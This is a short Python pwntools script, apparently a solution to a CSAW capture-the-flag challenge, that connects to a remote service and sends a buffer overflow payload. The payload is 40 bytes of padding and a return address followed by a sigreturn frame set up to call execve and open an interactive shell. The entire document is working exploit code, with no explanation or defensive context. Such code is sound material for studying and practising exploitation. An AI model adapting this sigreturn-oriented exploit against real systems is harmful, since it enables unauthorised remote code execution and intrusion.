from pwn import *

context.arch = 'amd64'
# con = remote('pwn.chal.csaw.io', 1002)
con = remote('192.168.10.66', 11002)

payload = 'A' * 40
payload += pack(0x400180)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x4001ca
frame.rip = 0x400185
payload += str(frame)
con.sendline(payload)

con.interactive()
